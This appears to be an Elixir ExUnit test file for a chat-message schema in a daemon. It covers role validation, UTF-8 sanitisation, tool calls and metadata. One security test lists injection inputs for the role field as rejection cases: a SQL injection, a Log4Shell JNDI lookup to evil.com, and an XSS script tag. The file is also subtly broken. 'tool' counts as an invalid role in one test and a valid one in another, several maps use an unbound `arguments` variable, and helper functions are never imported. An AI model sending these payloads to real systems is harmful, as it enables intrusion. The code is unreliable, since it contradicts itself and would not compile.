defmodule Daemon.Store.MessageTest do
  @moduledoc """
  Unit tests for Daemon.Store.Message schema.

  Tests validate:
  - Changeset validation with valid and invalid inputs
  - Role validation against allowed roles
  - UTF-8 validation and sanitization for content fields
  - Handling of nil and edge case values
  - Tool calls and metadata handling
  """
  use ExUnit.Case, async: true

  alias Daemon.Store.Message

  # ---------------------------------------------------------------------------
  # Fixtures
  # ---------------------------------------------------------------------------

  defp valid_attrs(overrides \\ %{}) do
    Map.merge(
      %{
        session_id: "session-#{System.unique_integer([:positive])}",
        role: "user",
        content: "Hello, world!",
        token_count: 5,
        channel: "http",
        metadata: %{}
      },
      overrides
    )
  end

  # ---------------------------------------------------------------------------
  # changeset/2 — validation
  # ---------------------------------------------------------------------------

  describe "changeset/2" do
    test "with valid attributes creates a valid changeset" do
      attrs = valid_attrs()
      changeset = Message.changeset(%Message{}, attrs)

      assert changeset.valid?
    end

    test "requires session_id" do
      attrs = Map.delete(valid_attrs(), :session_id)
      changeset = Message.changeset(%Message{}, attrs)

      refute changeset.valid?
      assert errors_on(changeset).session_id == ["can't be blank"]
    end

    test "requires role" do
      attrs = Map.delete(valid_attrs(), :role)
      changeset = Message.changeset(%Message{}, attrs)

      refute changeset.valid?
      assert errors_on(changeset).role == ["can't be blank"]
    end

    test "validates role inclusion" do
      invalid_roles = ["invalid", "USER", "system", "tool", nil, ""]

      for role <- invalid_roles do
        attrs = valid_attrs(%{role: role})
        changeset = Message.changeset(%Message{}, attrs)

        refute changeset.valid?,
                "Expected changeset to be invalid for role: #{inspect(role)}"

        assert errors_on(changeset).role == ["is invalid"]
      end
    end

    test "accepts all valid roles" do
      valid_roles = ["user", "assistant", "tool"]

      for role <- valid_roles do
        attrs = valid_attrs(%{role: role})
        changeset = Message.changeset(%Message{}, attrs)

        assert changeset.valid?,
                "Expected changeset to be valid for role: #{role}"
      end
    end

    test "allows content to be nil" do
      attrs = valid_attrs(%{content: nil})
      changeset = Message.changeset(%Message{}, attrs)

      assert changeset.valid?
    end

    test "allows empty string content" do
      attrs = valid_attrs(%{content: ""})
      changeset = Message.changeset(%Message{}, attrs)

      assert changeset.valid?
    end

    test "sanitizes invalid UTF-8 in content" do
      # Create invalid UTF-8 by mixing valid and invalid bytes
      invalid_utf8 = <<0xFF, 0xFE, 0x73, 0x74, 0x72, 0x69, 0x6E, 0x67>>
      # "string" with invalid prefix

      attrs = valid_attrs(%{content: invalid_utf8})
      changeset = Message.changeset(%Message{}, attrs)

      # Should not throw error, content should be sanitized
      assert changeset.valid?

      # The sanitized content should be valid UTF-8 or the valid part
      sanitized = get_change(changeset, :content)
      assert String.valid?(sanitized || "")
    end

    test "handles valid UTF-8 including emojis and CJK" do
      test_cases = [
        "Hello 世界",  # Chinese
        "こんにちは",  # Japanese
        "안녕하세요",   # Korean
        "Hello 👋 🌍",  # Emojis
        "مرحبا",       # Arabic
        "Привет"       # Cyrillic
      ]

      for content <- test_cases do
        attrs = valid_attrs(%{content: content})
        changeset = Message.changeset(%Message{}, attrs)

        assert changeset.valid?,
                "Expected changeset to be valid for content: #{content}"

        # Content should remain unchanged
        assert get_change(changeset, :content) == content
      end
    end

    test "allows tool_calls to be nil" do
      attrs = valid_attrs(%{tool_calls: nil})
      changeset = Message.changeset(%Message{}, attrs)

      assert changeset.valid?
    end

    test "allows tool_calls to be a map" do
      tool_calls = [
        %{name: "file_read", arguments: "{\"path\": \"/tmp/test.txt\"}"}
      ]

      attrs = valid_attrs(%{tool_calls: tool_calls})
      changeset = Message.changeset(%Message{}, attrs)

      assert changeset.valid?
    end

    test "allows tool_call_id to be nil" do
      attrs = valid_attrs(%{tool_call_id: nil})
      changeset = Message.changeset(%Message{}, attrs)

      assert changeset.valid?
    end

    test "allows tool_call_id to be a string" do
      attrs = valid_attrs(%{tool_call_id: "call_123"})
      changeset = Message.changeset(%Message{}, attrs)

      assert changeset.valid?
    end

    test "allows token_count to be nil" do
      attrs = valid_attrs(%{token_count: nil})
      changeset = Message.changeset(%Message{}, attrs)

      assert changeset.valid?
    end

    test "allows channel to be nil" do
      attrs = valid_attrs(%{channel: nil})
      changeset = Message.changeset(%Message{}, attrs)

      assert changeset.valid?
    end

    test "allows metadata to be nil" do
      attrs = valid_attrs(%{metadata: nil})
      changeset = Message.changeset(%Message{}, attrs)

      # Note: metadata has default %{} in schema, but nil is allowed in changeset
      assert changeset.valid?
    end

    test "allows metadata to be a map" do
      metadata = %{
        "key" => "value",
        "nested" => %{"deep" => "value"}
      }

      attrs = valid_attrs(%{metadata: metadata})
      changeset = Message.changeset(%Message{}, attrs)

      assert changeset.valid?
    end

    test "allows updates to existing message" do
      message = %Message{
        session_id: "session-123",
        role: "user",
        content: "Original"
      }

      attrs = %{content: "Updated"}
      changeset = Message.changeset(message, attrs)

      assert changeset.valid?
    end
  end

  # ---------------------------------------------------------------------------
  # UTF-8 validation edge cases
  # ---------------------------------------------------------------------------

  describe "UTF-8 validation edge cases" do
    test "handles mixed valid/invalid byte sequences" do
      # Valid string with some invalid bytes injected
      mixed = "Hello " <> <<0xFF, 0xFE>> <> "World"

      attrs = valid_attrs(%{content: mixed})
      changeset = Message.changeset(%Message{}, attrs)

      assert changeset.valid?

      # Content should be sanitized
      sanitized = get_change(changeset, :content)
      assert String.valid?(sanitized || "")
    end

    test "preserves valid multi-byte characters" do
      # Test various multi-byte sequences
      test_cases = [
        {<<0xE4, 0xB8, 0xAD>>, "Chinese character 中"},
        {<<0xF0, 0x9F, 0x98, 0x82>>, "Emoji 😂"},
        {<<0xE2, 0x82, 0xAC>>, "Euro sign €"}
      ]

      for {bytes, description} <- test_cases do
        attrs = valid_attrs(%{content: bytes})
        changeset = Message.changeset(%Message{}, attrs)

        assert changeset.valid?,
                "Expected valid for #{description}: #{inspect(bytes)}"

        assert get_change(changeset, :content) == bytes
      end
    end

    test "handles completely invalid byte sequences" do
      # All invalid bytes
      invalid = <<0xFF, 0xFE, 0xFD, 0xFC>>

      attrs = valid_attrs(%{content: invalid})
      changeset = Message.changeset(%Message{}, attrs)

      assert changeset.valid?

      # Should result in empty string or valid portion
      sanitized = get_change(changeset, :content)
      assert String.valid?(sanitized || "")
    end
  end

  # ---------------------------------------------------------------------------
  # Tool calls handling
  # ---------------------------------------------------------------------------

  describe "tool_calls handling" do
    test "accepts empty tool_calls list" do
      attrs = valid_attrs(%{tool_calls: []})
      changeset = Message.changeset(%Message{}, attrs)

      assert changeset.valid?
    end

    test "accepts multiple tool_calls" do
      tool_calls = [
        %{name: "file_read", arguments => "{\"path\": \"/tmp/test.txt\"}"},
        %{name: "file_write", arguments => "{\"path\": \"/tmp/out.txt\", \"content\": \"data\"}"}
      ]

      attrs = valid_attrs(%{tool_calls: tool_calls})
      changeset = Message.changeset(%Message{}, attrs)

      assert changeset.valid?
    end

    test "accepts tool_calls with complex nested arguments" do
      tool_calls = [
        %{
          name: "complex_tool",
          arguments => Jason.encode!(%{
            nested: %{deep: %{value: [1, 2, 3]}},
            list: [%{a: 1}, %{b: 2}]
          })
        }
      ]

      attrs = valid_attrs(%{tool_calls: tool_calls})
      changeset = Message.changeset(%Message{}, attrs)

      assert changeset.valid?
    end
  end

  # ---------------------------------------------------------------------------
  # Metadata handling
  # ---------------------------------------------------------------------------

  describe "metadata handling" do
    test "accepts empty metadata map" do
      attrs = valid_attrs(%{metadata: %{}})
      changeset = Message.changeset(%Message{}, attrs)

      assert changeset.valid?
    end

    test "accepts metadata with various value types" do
      metadata = %{
        string: "value",
        integer: 42,
        float: 3.14,
        boolean: true,
        nil: nil,
        list: [1, 2, 3],
        nested: %{deep: "value"}
      }

      attrs = valid_attrs(%{metadata: metadata})
      changeset = Message.changeset(%Message{}, attrs)

      assert changeset.valid?
    end

    test "accepts metadata with timestamp strings" do
      metadata = %{
        timestamp: DateTime.utc_now() |> DateTime.to_iso8601(),
        created_at: "2025-03-29T12:00:00Z"
      }

      attrs = valid_attrs(%{metadata: metadata})
      changeset = Message.changeset(%Message{}, attrs)

      assert changeset.valid?
    end
  end

  # ---------------------------------------------------------------------------
  # Security and data integrity
  # ---------------------------------------------------------------------------

  describe "security and data integrity" do
    test "handles extremely long content" do
      # Test with 1MB of content (should be within reasonable limits)
      long_content = String.duplicate("a", 1_000_000)

      attrs = valid_attrs(%{content: long_content})
      changeset = Message.changeset(%Message{}, attrs)

      # Should still be valid (no length constraint in schema)
      assert changeset.valid?
    end

    test "handles special characters in content" do
      special_cases = [
        "Newlines\nand\rcarriage\r\nreturns",
        "Tabs\tand\t\tmultiple\ttabs",
        "Quotes \"single\" and 'double'",
        "Backslashes \\ and \\\\ escaped",
        "Null bytes \x00 in middle",
        "Unicode escapes \u2764\uFE0F"
      ]

      for content <- special_cases do
        attrs = valid_attrs(%{content: content})
        changeset = Message.changeset(%Message{}, attrs)

        assert changeset.valid?,
                "Expected valid for content with special chars: #{inspect(content)}"
      end
    end

    test "prevents injection through role field" do
      # Even if someone tries to inject SQL or other malicious content
      # through role, it should be rejected by inclusion validation
      malicious_roles = [
        "user'; DROP TABLE messages; --",
        "admin' OR '1'='1",
        "${jndi:ldap://evil.com/a}",
        "<script>alert('xss')</script>"
      ]

      for role <- malicious_roles do
        attrs = valid_attrs(%{role: role})
        changeset = Message.changeset(%Message{}, attrs)

        refute changeset.valid?,
                "Expected invalid for malicious role: #{role}"

        assert errors_on(changeset).role == ["is invalid"]
      end
    end
  end
end
